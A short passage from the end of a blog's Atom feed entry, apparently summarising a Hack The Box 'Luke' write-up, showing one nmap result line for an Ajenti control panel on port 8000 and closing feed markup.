8000/tcp open http Ajenti http control panel |_http-title: Ajenti</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/luke/0.png" /></entry></feed>
